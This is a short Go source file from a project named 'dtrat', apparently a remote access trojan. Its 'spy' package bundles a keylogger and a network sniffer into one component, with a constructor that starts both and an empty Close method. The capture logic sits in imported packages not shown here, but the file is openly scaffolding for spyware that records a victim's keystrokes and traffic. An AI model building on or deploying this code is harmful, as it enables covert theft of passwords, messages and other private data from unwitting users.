package spy

import (
	"dtrat/spy/keylogger"
	"dtrat/spy/sniffer"
	"fmt"
)

type Spy struct {
	Keylogger *keylogger.Keylogger
	Sniffer   *sniffer.Sniffer
}

func NewSpy() (*Spy, error) {
	kl, err := keylogger.NewKeylogger()
	if err != nil {
		return nil, fmt.Errorf("NewKeylogger: %w", err)
	}

	sn, err := sniffer.NewSniffer()
	if err != nil {
		return nil, fmt.Errorf("NewSniffer: %w", err)
	}

	s := Spy{
		Keylogger: kl,
		Sniffer:   sn,
	}

	return &s, nil
}

func (s *Spy) Close() {

}
